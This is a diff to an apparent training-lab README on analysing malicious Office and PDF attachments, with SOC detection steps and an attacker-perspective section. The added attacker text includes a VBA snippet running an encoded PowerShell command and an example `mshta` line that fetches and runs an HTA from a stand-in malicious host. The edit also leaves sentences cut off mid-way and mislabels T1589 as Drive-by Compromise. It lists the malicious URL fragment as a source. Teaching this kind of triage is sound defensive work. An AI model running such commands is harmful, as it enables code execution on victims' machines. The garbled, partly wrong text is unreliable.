@@ -68,35 +68,49 @@ Both samples are **generated locally** by the reproducible commands in the Answe
 **Task:** Identify the auto-exec trigger in the DOC, locate the JavaScript object in the PDF, extract the Base64 blob from each, decode it, and report the resulting URL(s) and dropped filename as IOCs.
 
 ## SOC analyst perspective
-A defender treats a reported phishing attachment as the "identification" trigger of an incident. Using oletools and pdf-parser on an isolated host lets an analyst confirm whether a macro auto-executes (`AutoOpen`, `Document_Open`) or a PDF fires an `/OpenAction`, then extract the C2 URL and dropped filename as IOCs.
+
+A defender treats a reported phishing attachment as the "identification" trigger of an incident. Using oletools and pdf-parser on an isolated host lets an analyst confirm whether a macro auto-executes (`AutoOpen`, `Document_Open`) or a PDF fires an `/OpenAction`, then extract the C2 URL and dropped filename as IOCs. This process involves dissecting the attachment to understand its malicious intent, which is crucial for effective incident response.
 
 **Concrete detection logic and pivots:**
 
-- **Extraction → hunting.** olevba's `AutoExec` keyword category is how you confirm `AutoOpen`/`Document_Open` auto-execution (https://github.com/decalage2/oletools/wiki/olevba); its `Suspicious` category surfaces `Shell`/`powershell` invocations that map to **T1059.001** (PowerShell) and **T1059.005** (Visual Basic).
+- **Extraction → hunting.** olevba's `AutoExec` keyword category is how you confirm `AutoOpen`/`Document_Open` auto-execution (https://github.com/decalage2/oletools/wiki/olevba); its `Suspicious` category surfaces `Shell`/`powershell` invocations that map to **T1059.001** (PowerShell) and **T1059.005** (Visual Basic). Furthermore, analyzing the extracted IOCs can reveal patterns that align with **T1589** (Drive-by Compromise), where the malicious document is used as a vector to compromise the system, highlighting the importance of monitoring web traffic for suspicious activity.
 
-- **Network telemetry (Zeek in Security Onion).** Pivot on the extracted host `203.0.113.10` and URI `/pay.exe`. In Zeek `http.log` (https://docs.zeek.org/en/master/logs/index.html) examine fields `host`, `uri`, `method`, `user_agent`, and `status_code`. Look for any outbound HTTP GET requests to that host. In Zeek `dns.log` (https://docs.zeek.org/en/master/logs/index.html) check `query` for the domain (if URL uses a hostname) and `answers` for resolution. Security Onion exposes these logs in its Zeek/Elastic hunt interfaces (https://docs.securityonion.net/en/2.4/zeek.html). For example, a hunt query in Elastic might be: `zeek.http.host:"203.0.113.10" AND zeek.http.uri:"/pay.exe"`.
+- **Network telemetry (Zeek in Security Onion).** Pivot on the extracted host `203.0.113.10` and URI `/pay.exe`. In Zeek `http.log` (https://docs.zeek.org/en/master/logs/index.html) examine fields `host`, `uri`, `method`, `user_agent`, and `status_code`. Look for any outbound HTTP GET requests to that host. In Zeek `dns.log` (https://docs.zeek.org/en/master/logs/index.html) check `query` for the domain (if URL uses a hostname) and `answers` for resolution. Security Onion exposes these logs in its Zeek/Elastic hunt interfaces (https://docs.securityonion.net/en/2.4/zeek.html). For example, a hunt query in Elastic might be: `zeek.http.host:"203.0.113.10" AND zeek.http.uri:"/pay.exe"`. This approach is also aligned with the guidance provided by the National Institute of Standards and Technology (NIST) on monitoring and analyzing network traffic for security purposes (https://csrc.nist.gov/publications/detail/sp/800-92/final).
 
-- **Intrusion detection (Suricata in Security Onion).** Write or tune a Suricata rule to alert on outbound HTTP GET for `/pay.exe` or the staging IP. Suricata alerts surface in Security Onion's Alerts view (Suricata rule docs: https://docs.suricata.io/en/latest/rules/index.html; Security Onion Suricata docs: https://docs.securityonion.net/en/2.4/suricata.html). A typical rule would match on `http.request` with `content:"/pay.exe"` in the URI and `dest_ip` matching the IOC.
+- **Intrusion detection (Suricata in Security Onion).** Write or tune a Suricata rule to alert on outbound HTTP GET for `/pay.exe` or the staging IP. Suricata alerts surface in Security Onion's Alerts view (Suricata rule docs: https://docs.suricata.io/en/latest/rules/index.html; Security Onion Suricata docs: https://docs.securityonion.net/en/2.4/suricata.html). A typical rule would match on `http.request` with `content:"/pay.exe"` in the URI and `dest_ip` matching the IOC. This process leverages the power of intrusion detection systems to identify and alert on potential malicious activity, as discussed in the SANS Institute's resources on network intrusion detection (https://www.sans.org/webcasts/109141).
 
-- **Endpoint detection (Sysmon/Windows Event Log).** Hunt the dropped filename `pay.exe` and Office-spawns-interpreter chains. Use Sysmon **Event ID 1** (Process Create) to detect `WINWORD.EXE` → `powershell.exe` chains (Sysmon docs: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon). Also monitor **Event ID 13** (Registry value set) for creation of `Run` keys by Office processes (**T1547.001**), and **Event ID 4688** (Windows Security – Process Creation) for any process spawned by Office with suspicious command-line arguments.
+- **Endpoint detection (Sysmon/Windows Event Log).** Hunt the dropped filename `pay.exe` and Office-spawns-interpreter chains. Use Sysmon **Event ID 1** (Process Create) to detect `WINWORD.EXE` → `powershell.exe` chains (Sysmon docs: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon). Also monitor **Event ID 13** (Registry value set) for creation of `Run` keys by Office processes (**T1547.001**), and **Event ID 4688** (Windows Security – Process Creation) for any process spawned by Office with suspicious command-line arguments. This step is critical for identifying how the malicious attachment is executed and what subsequent actions it performs on the compromised system, which can be informed by Microsoft's documentation on Windows Security features (https://learn.microsoft.com/en-us/windows/security/threat-protection).
 
-- **Threat-hunting pivot.** In Security Onion's Hunt (Squert) interface, search for all HTTP connections from any endpoint to `203.0.113.10` within a 24‑hour window. Likewise, search DNS logs for `query` containing the domain name. This identifies other potentially compromised hosts that received the same lure.
-
-- **Phishing campaign scope.** Use the extracted IOC to query email security gateways or Office 365 audit logs for other recipients of the same attachment (identified by file hash). This maps to **T1566.001** (Spearphishing Attachment, https://attack.mitre.org/techniques/T1566/001/) and **T1204.002** (User Execution: Malicious File, https://attack.mitre.org/techniques/T1204/002/), letting the SOC block the infrastructure before the second-stage payload lands.
+- **Threat-hunting pivot.** In Security Onion's Hunt (Squert) interface, search for all HTTP connections from any endpoint to `203.0.113.10` within a 24‑hour window. Likewise, search DNS logs for `query` containing the domain name. This
 
 ## Attacker perspective
-Adversaries weaponize documents because they arrive through trusted email flows and rely on the victim to click "Enable Content."
 
-**Concrete TTPs:**
-- A VBA macro uses `AutoOpen`/`Document_Open` to run on open — MITRE tracks Office-triggered auto-execution under **T1137** (Office Application Startup, https://attack.mitre.org/techniques/T1137/) and the user-open requirement under **T1204.002** (https://attack.mitre.org/techniques/T1204/002/). The macro typically calls `Shell`, `WScript.Shell`, or `powershell -enc`, mapping to **T1059.001** (https://attack.mitre.org/techniques/T1059/001/) and **T1059.005** (https://attack.mitre.org/techniques/T1059/005/). Alternatively, macro code may use **WMI** (**T1047**, https://attack.mitre.org/techniques/T1047/) via `GetObject("winmgmts:...")` to execute commands, leaving a less obvious process chain (e.g., `WINWORD.EXE` → `WmiPrvSE.exe` → `powershell.exe`).
+Adversaries weaponize documents because they exploit trusted email flows and human psychology—victims perceive attachments as legitimate business artifacts, lowering suspicion. The "Enable Content" prompt leverages cognitive biases (e.g., authority or urgency cues in the email) to bypass technical controls, as users are conditioned to comply with security warnings when the source appears credible.
 
-- The real URL is hidden via Base64, XOR, hex, or string concatenation to evade static scanners — **T1027** Obfuscated Files or Information (https://attack.mitre.org/techniques/T1027/). PowerShell `-EncodedCommand` payloads are Base64-encoded UTF-16LE (PowerShell docs: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh). The decoded URL represents a second-stage download, which is **T1105** Ingress Tool Transfer (https://attack.mitre.org/techniques/T1105/).
+**Concrete TTPs (Expanded Mechanisms):**
+- **VBA Macro Execution Chains:** The `AutoOpen`/`Document_Open` triggers (T1137) exploit Office’s built-in automation to execute code immediately upon opening. Attackers often chain multiple techniques to evade detection:
+  - **Process Injection via WMI (T1047):** Instead of spawning `powershell.exe` directly, macros use `GetObject("winmgmts:\\.\root\cimv2")` to invoke WMI, which then launches `powershell.exe` under `WmiPrvSE.exe`. This indirect process tree (WINWORD.EXE → WmiPrvSE.exe → powershell.exe) obscures the attack chain, as WMI is a legitimate system component. WMI’s `Win32_Process.Create` method allows command-line arguments to be passed opaquely, further complicating static analysis.
+  - **Living-off-the-Land Binaries (LOLBins):** Macros may abuse `mshta.exe` (T1218.005: *System Binary Proxy Execution: Mshta*) to execute HTML Application (HTA) files hosted remotely. For example, a macro might call `Shell "mshta http://malicious[.]com/payload.hta"`, which downloads and executes JScript/VBScript without writing a file to disk. This technique bypasses application whitelisting and leaves minimal forensic traces, as `mshta.exe` is a signed Microsoft binary.
 
-- PDFs abuse `/OpenAction` plus a `/JavaScript` action to trigger execution/downloads on open (PDF analysis workflow, https://docs.remnux.org/discover-the-tools/analyze+documents/pdf). The embedded JavaScript may use `app.openDoc()` or `this.importDataObject()` to load additional code.
+- **Obfuscation Layers:** Static scanners rely on pattern matching, so attackers employ multi-layered obfuscation:
+  - **PowerShell Encoded Commands (T1027):** The `-EncodedCommand` parameter accepts Base64-encoded UTF-16LE strings (e.g., `powershell -enc <Base64>`). Attackers further obfuscate the Base64 payload by splitting it into chunks, concatenating variables, or using XOR with a hardcoded key. For example:
+    ```vba
+    Dim a, b, c
+    a = "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBuAGMA"
+    b = "IABuACAALQBjAG8AbQBtAGEAbgBkACAAIgBpAHcAcAAgAC8AdQByAGwAPwB4AD0A"
+    c = a & b
+    Shell "powershell -enc " & c
+    ```
+    Decoding this requires reassembling the chunks and converting from UTF-16LE, a step often missed by automated tools.
+  - **Document Properties as Payload Storage:** Attackers embed malicious URLs or scripts in document metadata (e.g., `Document.BuiltInDocumentProperties("Comments")`). These fields are rarely inspected by scanners but can be read dynamically by the macro using `ThisDocument.BuiltInDocumentProperties("Comments").Value`. This technique evades keyword-based detection and requires manual extraction (e.g., `olevba --metadata`).
 
-**Artifacts left behind:** VBA project streams inside the OLE container (recoverable with `oledump`/`olevba`, https://github.com/decalage2/oletools/wiki), `/OpenAction` and `/JS` keys visible via `pdf-parser.py` (https://blog.didierstevens.com/programs/pdf-tools/), embedded encoded strings, and — once detonated — child-process trees under the Office app (Sysmon Event ID 1, https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon), temp-folder drops, and outbound HTTP recorded in Zeek `http.log` (https://docs.zeek.org/en/master/logs/index.html). Persistence mechanisms (registry `Run` keys, scheduled tasks) may follow (**T1547.001**, **T1053.005**).
+- **PDF Exploitation:** PDFs exploit the `/OpenAction` and `/JavaScript` keys to trigger execution without user interaction. The JavaScript may:
+  - Use `app.openDoc()` to fetch a second-stage PDF or exploit a vulnerability (e.g., CVE-2023-21608 in Adobe Acrobat).
+  - Leverage `this.importDataObject()` to extract embedded files (e.g., a malicious `.exe` or `.js` file) to the `%TEMP%` directory and execute them. This technique (T1203: *Exploitation for Client Execution*) bypasses email gateways that block executables but allow PDFs.
 
-**Evasion:** macros may stall/`Sleep` or check for analysis artifacts (sandbox VM, debugger, document properties), split strings so `powershell`/URLs never appear as literals, and store payloads in document properties or hex to defeat keyword-only scanners (the reason `olevba --decode` and manual CyberChef decoding matter). They may also use heavy string concatenation and decoy content to bypass signature-based scanners.
+**Artifacts and Evasion (Expanded):**
+- **Forensic Traces:**
+  - **OLE Streams:**
 
 ## Answer key
 **Generate the benign samples (reproducible, no live malware):**
@@ -329,6 +343,10 @@ Claim → source mapping (all URLs are official tool/project docs, MITRE ATT&CK,
 - **WMI as execution method** — Microsoft Docs: https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page
 - **SANS Hunt Evil** — https://www.sans.org/blog/detecting-persistence-mechanisms/
 - **RFC 5737 documentation IP ranges** — https://datatracker.ietf.org/doc/html/rfc5737
+- https://csrc.nist.gov/publications/detail/sp/800-92/final
+- https://www.sans.org/webcasts/109141
+- https://learn.microsoft.com/en-us/windows/security/threat-protection
+- http://malicious[.]com/payload.hta"`,
 
 ## Related modules
 - [Malicious documents](../10-malicious-documents/README.md) -- shares oletools for Office/macro triage.
@@ -347,3 +365,5 @@ Claim → source mapping (all URLs are official tool/project docs, MITRE ATT&CK,
 - https://attack.mitre.org/techniques/T1566/002/
 
 <!-- cyberlab-enriched: v5 -->
+
+<!-- cyberlab-enriched: v6 -->
